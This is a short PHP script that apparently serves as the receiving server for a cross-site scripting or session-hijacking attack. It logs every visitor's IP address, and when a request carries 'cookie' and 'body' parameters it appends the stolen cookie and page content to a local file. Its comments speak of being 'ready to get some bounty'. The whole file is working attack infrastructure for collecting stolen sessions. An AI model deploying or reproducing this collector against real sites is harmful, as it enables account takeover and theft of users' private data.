<?php 

  

define("CRENDETIALS_FILE_NAME", "S@v3H3reTh3Password.txt"); 

define("IP_FILE_NAME", "S@v3H3reTh3IP.txt"); 

  

function log_credentials($cookie, $body){ 

    $file = fopen(CRENDETIALS_FILE_NAME,"a"); 

    fwrite($file, "# Client IP = ".$_SERVER['REMOTE_ADDR']."\n"); 
    fwrite($file, "## Cookie:\n"."**".$cookie."**\n\n"); 
    fwrite($file, "## Body: \n```html\n".$body."\n\n```\n\n"); 
    fwrite($file, "**The END**\n"); 
    fclose($file); 

} 

  
//if the post or get request do not contain the magic words
if(!isset($_REQUEST['cookie']) and !isset($_REQUEST['body'])  ) 

{ 

    // User is just visited haven't send credentials yet. 

    $file = fopen(IP_FILE_NAME, "a"); 

    fwrite($file, "Client IP = ".$_SERVER['REMOTE_ADDR']."\n"); 

    fclose($file); 

} else { //otherwise we are ready to get some bounty

    // Now it's the time..! 

    log_credentials($_REQUEST['cookie'], $_REQUEST['body']); 

} 

?> 

 
